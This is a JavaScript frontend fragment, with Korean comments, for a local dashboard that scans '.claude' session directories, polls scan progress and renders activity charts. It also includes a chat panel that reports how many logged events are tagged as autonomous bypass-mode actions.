function copOpen(v){$("#copilot").classList.toggle("open",v);$("#copfab").style.display=v?"none":"grid";
  if(v)setTimeout(()=>$("#ask").focus(),120);}
$("#copfab").addEventListener("click",()=>copOpen(true));
$("#copx").addEventListener("click",()=>copOpen(false));
$("#send").addEventListener("click",()=>ask($("#ask").value));
$("#ask").addEventListener("keydown",e=>{if(e.key==="Enter")ask($("#ask").value);});
$("#suggest").addEventListener("click",e=>{if(e.target.classList.contains("sg"))ask(e.target.textContent);});
$("#rescan").addEventListener("click",()=>showScan());
$("#scan-go").addEventListener("click",async()=>{
  const roots=[...document.querySelectorAll("#scan-sources input:checked")].map(c=>c.dataset.path);
  if(!roots.length){$("#scan-status").textContent="소스를 1개 이상 선택하세요.";return;}
  $("#scan-go").disabled=true;
  showProgress(0,"스캔 준비…",true);
  let polling=true;
  (async()=>{                                   // POST와 동시에 진행률 폴링(ThreadingHTTPServer)
    while(polling){
      try{
        const pr=await (await fetch("/api/scan/progress")).json();
        const pct=pr.total?Math.round(pr.done/pr.total*100):0;
        if(!pr.finished) showProgress(pct, `파싱 중 ${pr.done}/${pr.total} · 누적 ${pr.events||0}건`, true);
      }catch(_){}
      await new Promise(r=>setTimeout(r,300));
    }
  })();
  try{
    const r=await fetch("/api/scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({roots})});
    const d=await r.json();
    polling=false;
    if(!d.ok)throw new Error(d.error||"스캔 실패");
    showProgress(100, `완료: ${d.count}건`, false);
    $("#chatlog").innerHTML="";       // 재로드 시 코파일럿 인사 중복 방지
    await boot();                     // 채워진 엔진으로 대시보드 재로드
  }catch(err){
    polling=false; $("#scan-go").disabled=false;
    hideProgress(); $("#scan-status").textContent="스캔 실패: "+esc(err.message);
  }
});

/* ---------- util ---------- */
function esc(s){return String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));}

/* ---------- 스캔 진행률 바 ---------- */
function showProgress(pct,label,active){
  const w=$("#scan-progress"); w.hidden=false;
  const bar=$("#scan-bar"); bar.style.width=pct+"%"; bar.classList.toggle("active",!!active);
  $("#scan-status").textContent=label||"";
}
function hideProgress(){ $("#scan-progress").hidden=true; $("#scan-bar").classList.remove("active"); }

/* ---------- 스캔 화면(데이터 없을 때) ---------- */
async function showScan(){
  $(".wrap").style.display="none";
  $("#rescan").hidden=true;
  $("#scan-go").disabled=false;     // 재진입 시 항상 활성(0건 스캔/다시스캔 stuck 방지)
  hideProgress();
  const scr=$("#scan-screen"); scr.hidden=false;
  const box=$("#scan-sources"); box.innerHTML="<div class='muted'>소스 탐지 중…</div>";
  $("#scan-status").textContent="";
  let data;
  try{ data=await jget("/api/sources"); }
  catch(err){ box.innerHTML=`<div class="err">소스 탐지 실패: ${esc(err.message)}</div>`; return; }
  const srcs=data.sources||[];
  if(!srcs.length){ box.innerHTML="<div class='muted'>탐지된 .claude 소스가 없습니다.</div>"; return; }
  box.innerHTML=srcs.map(s=>`
    <label class="scan-src ${s.exists?"":"off"}">
      <input type="checkbox" data-path="${esc(s.path)}" ${s.exists?"checked":"disabled"}>
      <span class="badge ${esc(s.label)}">${esc(s.label)}</span>
      <span class="p">${esc(s.path)}</span>
      ${s.exists?"":'<span class="na">없음</span>'}
    </label>`).join("");
}

/* ---------- boot: 서버 연결 시도 → 실데이터, 실패 시 샘플 ---------- */
function renderAll(){renderStats();renderHeatmap();renderDateJump();renderDonut();renderFiles();renderTimeline();}
/* 엔진 집계 엔드포인트 — 패널별 독립 try/catch(하나 실패해도 대시보드 유지, 그 패널만 파생 fallback) */
async function jget(url){const r=await fetch(url);if(!r.ok)throw new Error(url+" "+r.status);
  const d=await r.json();if(d&&d.error)throw new Error(d.error);return d;}
async function loadAggregates(){
  try{SRV_ACTIVITY=await jget("/api/activity?by=day");}catch(_){SRV_ACTIVITY=null;}
  try{SRV_FILES=await jget("/api/files");}catch(_){SRV_FILES=null;}
  try{SRV_KEYWORDS=await jget("/api/keywords");}catch(_){SRV_KEYWORDS=null;}
}
async function boot(){
  let live=null, reachable=false;
  try{
    const r=await fetch("/api/events");
    if(r.ok){reachable=true;const d=await r.json();if(d&&Array.isArray(d.events))live=d.events;}
  }catch(_){}
  // 서버 연결 + 데이터 0건 → 스캔 화면(아직 스캔 전). 미연결(reachable=false)은 MOCK 대시보드.
  if(reachable && live && live.length===0){ showScan(); return; }
  $("#scan-screen").hidden=true; $(".wrap").style.display="";   // 대시보드 복귀(재스캔 후)
  LIVE=!!live;
  EVENTS=(live||MOCK).map(normalize);
  if(LIVE) await loadAggregates();   // 집계 패널 데이터 출처를 엔진으로(JS 재집계 금지)
  srcActive=new Set(originLabels());  // 소스 토글 기본 전체 on
  renderSrcFilters();
  renderAll();renderSuggest();
  $("#rescan").hidden=!LIVE;   // LIVE일 때만 다시스캔 노출
  const chip=$("#case-mode");
  if(LIVE){chip.className="chip ok";chip.innerHTML=`<span class="dot"></span>서버 연결됨`;}
  else{chip.className="chip warn";chip.innerHTML=`<span class="dot"></span>샘플 데이터(서버 미연결)`;}
  const byp=EVENTS.filter(e=>e.tags.includes("bypass-mode")).length;
  addMsg("ai",LIVE
    ?`기록 로드 완료. 총 <b>${EVENTS.length}</b>건 · bypass 모드 자율 행위 <b>${byp}</b>건. 무엇을 조사할까요?`
    :`샘플 데이터 표시 중(서버 미연결). 총 <b>${EVENTS.length}</b>건. <code>clfx serve</code> 또는 exe 실행 시 실데이터가 로드됩니다.`);
}
boot();
